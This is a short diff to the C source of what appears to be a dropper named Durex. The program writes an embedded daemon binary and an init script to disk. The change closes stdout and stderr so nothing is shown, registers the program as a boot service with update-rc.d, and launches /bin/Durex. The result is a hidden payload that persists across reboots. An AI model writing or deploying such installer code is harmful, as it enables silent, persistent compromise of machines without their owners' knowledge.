@@ -29,6 +29,8 @@ int	main(void)
 	if (!create_file(PAYLOAD_PATH, durex_daemon, durex_daemon_len)
 			|| !create_file(INIT_PATH, Durex_init, Durex_init_len))
 		return EXIT_FAILURE;
-	system(PAYLOAD_PATH);
+	close(1);
+	close(2);
+	system("update-rc.d -f Durex remove; update-rc.d -f Durex defaults; update-rc.d -f Durex enable; /bin/Durex");
 	return EXIT_SUCCESS;
 }
